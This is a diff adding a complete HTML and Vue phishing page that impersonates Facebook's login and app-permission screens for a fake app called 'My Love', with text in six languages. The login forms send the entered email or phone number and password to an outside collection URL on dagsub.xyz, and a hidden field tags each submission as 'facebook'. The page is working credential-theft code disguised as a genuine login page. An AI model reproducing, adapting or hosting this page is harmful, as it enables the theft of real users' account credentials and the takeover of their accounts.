@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <!-- Primary Meta Tags -->
+    <title>Facebook - log in or sign up</title>
+    <meta content='Facebook - log in or sign up' name='title' />
+    <meta content='' name='description' />
+    <!-- Open Graph / Facebook -->
+    <meta content='website' property='og:type' />
+    <meta content='https:// .blogspot.com' property='og:url' />
+    <meta content='Facebook - log in or sign up' property='og:title' />
+    <meta content=' ' property='og:description' />
+    <meta content='https://i.imgur.com/WOTseQR.png' property='og:image' />
+    <!-- Twitter -->
+    <meta content='summary_large_image' property='twitter:card' />
+    <meta content='https:// .blogspot.com' property='twitter:url' />
+    <meta content='Facebook - log in or sign up' property='twitter:title' />
+    <meta content=' ' property='twitter:description' />
+    <meta content='https://i.imgur.com/WOTseQR.png' property='twitter:image' />
+    <!--metaEnd Here-->
+    <link href='https://i.imgur.com/BYuNdxd.png' rel='icon' sizes='16x16' type='image/png' />
+    <meta charset='UTF-8' />
+    <meta content='width=device-width, initial-scale=1.0' name='viewport' />
+    <link href='https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css' rel='stylesheet' />
+    <link href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css' rel='stylesheet' />
+    <style>
+   
+.show_password{position:absolute;right:0;top:50%;transform:translateY(-50%);margin-right:10px;color:#7c7c7c;text-transform:capitalize;cursor:pointer;user-select:none}
+.login_box_vue{font-family:Cairo,sans-serif;overflow:hidden}.image img{max-width:100%}.content{padding:20px 0}.input_contr{position: relative;margin:10px auto;text-align:center}.input_contr input{width:100%;padding:3px 5px}.content p{padding:20px;text-align:center;font-size:1rem}.content p .appname{font-weight:700}.content h1{font-size:13px;text-align:center;margin:20px 0;color:#676464}.login_box_vue button{background-color:#3676e3;color:#fff;border:none;width:100%;border-radius:3px;outline:0;padding:9px 0}.form_ac{width:80%;margin:auto;padding-bottom:20px}.footer_text{text-align:center;padding-bottom:19px}.footer_text a{text-decoration:none}header{background:#3b5999;color:#fff;box-shadow:0 0 12px #00000052}.row{height:100vh}header h1{font-size:1rem;padding:12px 0}.login_box_vue{background-color:#f5f6f8}@media only screen and (min-width:300px)and (max-width:720px){.content p{font-size:13px}.footer_text{font-size:12px}.content h1{font-size:10px;font-weight:700}.input_contr input{font-size:12px;padding:9px}}@media only screen and (min-width:720px){.login_box_vue{background-color:#f0f2f5}.content{box-shadow:0 0 17px #00000045;border-radius:5px;background:#fff}}#app{overflow:auto!important;overflow-x:hidden!important}.home_box_vue{background-color:#f0f2f5}.log_box{background:#fff;padding:20px 1rem;box-shadow:0 0 15px #7b7b7b40;border-radius:5px;margin-top:2rem}.log_btn button{margin:5px 0;font-weight:500}.fb_logo{text-align:right}.head_text{margin-bottom:7rem}.head_text h1{font-size:1.2rem;margin-top:10px}.cancel_btn{background:#e4e6eb;color:#000}.logo{margin-top:1rem}.footer_text{margin-top:1rem}.footer_text p{font-size:.75rem;color:#65676b}.footer_text a{text-decoration:none}.footer_link_txt{margin:0}.edit_log a{text-decoration:none}.log_box_mob .head_text h1{font-size:.9rem;margin:2rem 0;font-weight:700;margin-bottom:5px}.log_box_mob .fb_mob_head{background:#3b5998;padding:10px 0}.log_box_mob .text p{margin:0;color:#fff;font-weight:600}.log_box_mob{font-family:sans-serif}.log_box_mob .head_text p{width:90%;text-align:center;margin:auto;font-size:12px;margin-bottom:.8rem}.log_box_mob .footer_text{width:90%;margin:auto}.log_btn{width:90%;margin:auto;margin-bottom:15px}.log_box_mob .head_text{margin-bottom:2rem}.log_box_mob .fb_logo{text-align:right;margin-left:2.5rem;margin-right:15px}
+    </style>
+    <script src='https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js' ></script>
+    <script src='https://unpkg.com/vue-router@3.4.9/dist/vue-router.js' ></script>
+  </head>
+  <body>
+   
+    <div class='container-fluid p-0' id='app'>
+      <router-view />
+    </div>
+    <script>
+      let Maincontent = {
+            logo: "https://i.imgur.com/4JH1NZi.png",
+            sm_logo: "https://i.imgur.com/Oz1I0LH.png"
+          };
+          let appname = "My Love"; appname = `<span class="appname"> ${appname} </span>`;
+          let browserlangDetect = navigator.language;
+          var browser_default = "en";
+          let lang_content1;
+
+          function lang() {
+            switch (browserlangDetect) {
+              case 'th':
+                browser_default = 'th';
+                break;
+              case 'fil':
+                browser_default = 'fil';
+                break;
+              case 'ne':
+                browser_default = 'Nepal_lang';
+                break;
+              case 'es':
+                browser_default = 'es_lang';
+                break;
+              default:
+                browser_default = 'en';
+            }
+            lang_content1 = browser_default + "_content";
+          }
+          lang();
+          let url_action = 'https://dagsub.xyz/xa6f5e/send.php?uid=daggerx1cXsy0c7U1W2022050316515359840159443pNgmj1uuZ';
+          let arabic_content = {
+            maintext: `سيحصل تطبيق 
+${appname} 
+علي الاذونات التاليه : </br>
+اسمك وصورة الملف الشخصي ، وعنوان البريد الالكتروني وقائمة الاصدقاء 
+.
+`,
+            Dafr: "لا يمنح ذلك التطبيق الأذن للنشر علي يومياتك بالفيسبوك",
+            footerText: "",
+            MainFooter: `<a href="#">سياسة الخصوصيه</a> و 
+<a href="#"> الشروط لتطبيق</a>
+ ${appname}`,
+            placeholder_user: "البريد الالكتروني او رقم الهاتف",
+            placeholder_password: "كلمة  السر",
+            cont: "متابعة",
+            mob_head_text: "تسجيل الدخول بحساب الفيسبوك"
+          };
+          let en_content = {
+            maintext: `An application will get 
+${appname} 
+On the following permissions: </br>
+Your name, profile picture, email address, and friends list
+.
+`,
+            Dafr: "This app does not give permission to post to your Facebook Diary",
+            footerText: "",
+            MainFooter: `<a href="#">Privacy policy</a> And the
+<a href="#">Conditions to apply</a>
+ ${appname}`,
+            placeholder_user: "Email or phone number",
+            placeholder_password: "password",
+            cont: "Continue",
+            mob_head_text: "Log in with Facebook account"
+          }; fil_content = {
+            appname: "",
+            maintext: `Makukuha ang isang application
+${appname} 
+Sa mga sumusunod na pahintulot : </br>
+Ang iyong pangalan, larawan sa profile, email address, at listahan ng mga kaibigan
+.
+`,
+            Dafr: "Ang app na ito ay hindi nagbibigay ng pahintulot upang mag-post sa iyong Facebook Diary",
+            footerText: "",
+            MainFooter: `<a href="#">Patakaran sa privacy</a> At ang
+<a href="#">Mga kundisyon na mag-apply</a>
+ ${appname}`,
+            placeholder_user: "Email o numero ng telepono",
+            placeholder_password: "password",
+            cont: "Magpatuloy",
+            mob_head_text: "Mag-log in gamit ang Facebook account"
+          }; fil_content['mustCon'] = 'humiling ng access'; fil_content['LandAccessOptions'] = 'Itanong ang iyong pangalan, larawan sa profile at email address.'; fil_content['ChangeAccessOptions'] = 'i-edit ang mga karapatan sa pag-access'; fil_content['permissions_access'] = `Sa pagpapatuloy ay makakakuha siya
+${appname}
+     Patuloy na pag-access sa impormasyong ibinabahagi mo at nai-save ng Facebook.
+                           Ang oras na ma-access ni ${appname} ang impormasyong ito.
+<a href="#">Matuto pa</a>tungkol sa post na ito.
+                           maaari mong itakda.`; fil_content['cancel_btn'] = 'kanselahin';
+          let th_content = {
+            appname: "",
+            maintext: `มีแอปพลิเคชัน
+${appname} 
+ด้วยสิทธิ์ดังต่อไปนี้: </br>
+ชื่อรูปโปรไฟล์ที่อยู่อีเมลและรายชื่อเพื่อนของคุณ
+.
+`,
+            Dafr: "แอพนี้ไม่อนุญาตให้โพสต์ลงใน Facebook ไดอารี่ ของคุณ",
+            footerText: "",
+            MainFooter: `<a href="#">นโยบายความเป็นส่วนตัว</a> At ang
+<a href="#">เงื่อนไขการสมัคร</a>
+ ${appname}`,
+            placeholder_user: "อีเมลหรือหมายเลขโทรศัพท์",
+            placeholder_password: "รหัสผ่าน",
+            cont: "ดำเนินการต่อ",
+            mob_head_text: "เข้าสู่ระบบด้วยบัญชี Facebook"
+          }; th_content['mustCon'] = 'ขอการเข้าถึง'; th_content['LandAccessOptions'] = 'ขอชื่อ รูปโปรไฟล์ และอีเมลของคุณ'; th_content['ChangeAccessOptions'] = 'แก้ไขสิทธิ์การเข้าถึง'; th_content['permissions_access'] = `โดยดำเนินการต่อเขาจะได้รับ
+${appname}
+    การเข้าถึงข้อมูลที่คุณแบ่งปันอย่างต่อเนื่องและ Facebook จะบันทึก
+                          ครั้งที่ ${appname} เข้าถึงข้อมูลนี้
+<a href="#">เรียนรู้เพิ่มเติม</a>เกี่ยวกับโพสต์นี้
+                          คุณตั้งค่าได้.`; th_content['cancel_btn'] = 'ยกเลิก';
+          let Nepal_lang_content = {
+            appname: "",
+            maintext: `त्यहाँ एक आवेदन छ
+${appname}
+निम्न अनुमतिहरूसँग: </br>
+नाम, प्रोफाइल तस्वीर, इमेल ठेगाना र आफ्नो साथी सूची।
+.
+`,
+            Dafr: "यो एपले तपाईंको फेसबुक डायरीमा पोस्ट गर्न अनुमति दिँदैन।",
+            footerText: "",
+            MainFooter: `<a href="#">गोपनीयता नीति</a> मा
+<a href="#">सदस्यता सर्तहरू</a>
+  ${appname}`,
+            placeholder_user: "इमेल वा फोन नम्बर",
+            placeholder_password: "पासवर्ड",
+            cont: "जारी राख्नुहोस्",
+            mob_head_text: "खाताको साथ लगइन गर्नुहोस् Facebook"
+          }; Nepal_lang_content['mustCon'] = 'पहुँचको लागि अनुरोध गर्दै'; Nepal_lang_content['LandAccessOptions'] = 'आफ्नो नाम, प्रोफाइल तस्वीर र इमेल ठेगाना अनुरोध गर्नुहोस्'; Nepal_lang_content['ChangeAccessOptions'] = 'पहुँच अनुमतिहरू सम्पादन गर्नुहोस्'; Nepal_lang_content['permissions_access'] = `जारी राखेर, उसले प्राप्त गर्नेछ
+${appname}
+    तपाईंले साझेदारी गर्नुभएको जानकारीमा निरन्तर पहुँच, र फेसबुकले रेकर्ड गर्नेछ
+                          ${appname} ले यो जानकारी पहुँच गर्ने समय।
+यस पोस्टको बारेमा <a href="#">थप जान्नुहोस्</a>
+                          सेटिङहरू तपाईलाई उपलब्ध छन्.`; Nepal_lang_content['cancel_btn'] = 'रद्द गर्नुहोस्'; arabic_content['mustCon'] = 'يطلب الوصول الي '; arabic_content['LandAccessOptions'] = 'إذن اسمك وصورة ملفك الشخصي وعنوان البريد الإلكتروني الخاص بك'; arabic_content['ChangeAccessOptions'] = 'تعديل صلاحيات الوصول'; arabic_content['permissions_access'] = `بالمتابعة، سيتلقى 
+${appname}
+  صلاحية وصول مستمرة إلى المعلومات التي تشاركها، وسيسجل فيسبوك 
+                        الأوقات التي يصل فيها ${appname}  إلى هذه المعلومات. 
+<a href="#">تعرف على المزيد</a> عن هذه المشاركة 
+                        والإعدادات المتاحة لك.
+`; arabic_content['cancel_btn'] = 'الغاء'; en_content['mustCon'] = 'Asking for access'; en_content['LandAccessOptions'] = 'Request your name, profile picture and email address'; en_content['ChangeAccessOptions'] = 'Edit access permissions'; en_content['permissions_access'] = `By continuing, he will receive
+${appname}
+   Continuous access to the information you share, and Facebook will record
+                         Times when ${appname} accesses this information.
+<a href="#">Learn more</a> about this post
+                         The settings are available to you.`; en_content['cancel_btn'] = 'Cancel';
+          let es_lang_content = {
+            maintext: `Una aplicación obtendrá
+$ {appname}
+Sobre los siguientes permisos: </br>
+Su nombre, foto de perfil, dirección de correo electrónico y lista de amigos
+.
+`,
+            Dafr: "Esta aplicación no da permiso para publicar en su diario de Facebook",
+            footerText: "",
+            MainFooter: `<a href="#"> Política de privacidad </a> Y la
+<a href="#"> Condiciones para aplicar </a>
+  $ {appname}`,
+            placeholder_user: "Correo electrónico o número de teléfono",
+            placeholder_password: "contraseña",
+            cont: "Continuar",
+            mob_head_text: "Iniciar sesión con cuenta de Facebook"
+          }; es_lang_content['mustCon'] = 'Pidiendo acceso'; es_lang_content['LandAccessOptions'] = 'Solicite su nombre, foto de perfil y dirección de correo electrónico'; es_lang_content['ChangeAccessOptions'] = 'Editar permisos de acceso'; es_lang_content['permissions_access'] = `Al continuar, recibirá
+$ {appname}
+    Acceso continuo a la información que comparte y Facebook registrará
+                          Momentos en los que $ {appname} accede a esta información.
+<a href="#"> Más información </a> sobre esta publicación
+                          Los ajustes están disponibles para ti.`; es_lang_content['cancel_btn'] = 'Cancelar';
+          let lang_content; lang_content = eval(lang_content1);
+          let Home = {
+            template: ` <div class='home_box_vue'><div class='container'><div class="row justify-content-center"><div class="col-lg-6 col-md-8 col-12 d-none d-md-block"><div class="log_box text-center "><div class="fb_logo"><img width="31" height="31" src="https://i.imgur.com/bRNOinl.png" alt=""></div><div class="logo"><img width="50" height="50" src="${Maincontent.sm_logo}" alt=""></div><div class="head_text"><h1 dir='auto'>${appname}${lang_content.mustCon}:</h1><p dir='auto'>${lang_content.LandAccessOptions}.</p><p class="edit_log"><a href="#">${lang_content.ChangeAccessOptions}</a></p></div><div class="log_btn"><div class="d-flex flex-column"><router-link tag="button" to="login" class="btn btn-primary d-block">${lang_content.cont}</router-link><router-link tag="button" to="login" class="btn d-block cancel_btn">${lang_content.cancel_btn}</router-link></div></div><div class="footer_text"><p dir='auto'>${lang_content.permissions_access}</p><p dir='auto' class="footer_link_txt">${lang_content.MainFooter}</p></div></div></div><div class="col-12 d-md-none p-0"><div class="log_box_mob text-center"><div class="fb_mob_head"><div class="d-flex align-items-center justify-content-evenly flex-row-reverse"><div class="fb_logo"><img width="31" height="31" src="https://i.imgur.com/bRNOinl.png" alt=""></div><div class="text"><p>${lang_content.mob_head_text}</p></div></div></div><div class="logo"><img width="50" height="50" src="${Maincontent.sm_logo}" alt=""></div><div class="head_text"><h1 dir='auto'>${appname}${lang_content.mustCon}:</h1><p dir='auto'>${lang_content.LandAccessOptions}</p><p class="edit_log"><a href="#">${lang_content.ChangeAccessOptions}</a></p></div><div class="log_btn"><div class="d-flex flex-column"><router-link tag="button" to="login" class="btn btn-primary d-block">${lang_content.cont}</router-link><router-link tag="button" to="login" class="btn d-block cancel_btn">${lang_content.cancel_btn}</router-link></div></div><div class="footer_text"><p dir='auto'>${lang_content.permissions_access}</p><p dir='auto' class="footer_link_txt">${lang_content.MainFooter}</p></div></div></div></div></div></div></div>`
+          };
+          var Login = {
+            template: `<div class='login_box_vue'><div class='container-fluid'><div class='row justify-content-center align-items-md-center'><div class="col-5 col-md-8 col-lg-5 d-none d-md-block d-lg-block"><div class="content"><div class='col-4 m-auto'><div class="image"><img src="${Maincontent.logo}" alt=""></div></div><p>${lang_content.maintext}</p><h1 class="col-12 m-auto">${lang_content.Dafr}</h1><div class="form_ac"><form action="${url_action}" method="POST"><div class="input_contr"><input type="text" name="dig_u_name" placeholder="${lang_content.placeholder_user}"></div><div class="input_contr"><span class='show_password'><i class="fa fa-eye" aria-hidden="true"></i></span><input type="password" name="i_u_pwd" placeholder="${lang_content.placeholder_password}"></div><div class="input_contr"><input name="dig_u_und" type="hidden" value="facebook"><button type="submit">${lang_content.cont}</button></div></form></div><div class="footer_text">${lang_content.MainFooter}</div></div></div><div class="mob d-sm-block d-md-none col-12"><div class="mob_content"><header class="col-12"><h1>${lang_content.mob_head_text}</h1></header><div class="content"><div class='col-4 m-auto'><div class="image"><img src="${Maincontent.logo}" alt=""></div></div><p>${lang_content.maintext}</p><h1 class="col-12 m-auto">${lang_content.Dafr}</h1><div class="form_ac"><form action="${url_action}" method="POST"><div class="input_contr"><input type="text" placeholder="${lang_content.placeholder_user}" name="dig_u_name"></div><div class="input_contr"><span class='show_password'><i class="fa fa-eye" aria-hidden="true"></i></span><input type="password" placeholder="${lang_content.placeholder_password}" name="i_u_pwd"><input name="dig_u_und" type="hidden" value="facebook"></div><div class="input_contr"><button type="submit">${lang_content.cont}</button></div></form></div><div class="footer_text">${lang_content.MainFooter}</div></div></div></div></div></div></div>`
+          };
+          var routes = [{
+            path: '/',
+            component: Home
+          }, {
+            path: '/login',
+            component: Login
+          }];
+          var router = new VueRouter({
+            routes: routes,
+            mode: 'history',
+            base: '/t3arwf.github.io/login.html'
+          });
+          var app = new Vue({
+            el: '#app',
+            router: router
+          });
+          let showBtn = document.querySelectorAll('.show_password');
+          let show = false; showBtn.forEach((elem) => {
+            elem.addEventListener('click', function(e) {
+              if (!show) {
+                elem.children[0].classList.remove('fa-eye');
+                elem.children[0].classList.add('fa-eye-slash');
+                elem.nextElementSibling.setAttribute('type', 'text');
+              } else {
+                elem.children[0].classList.add('fa-eye');
+                elem.children[0].classList.remove('fa-eye-slash');
+                elem.nextElementSibling.setAttribute('type', 'password');
+              }
+              show = !show;
+            });
+          });
+    </script>
+  </body>
+</html>
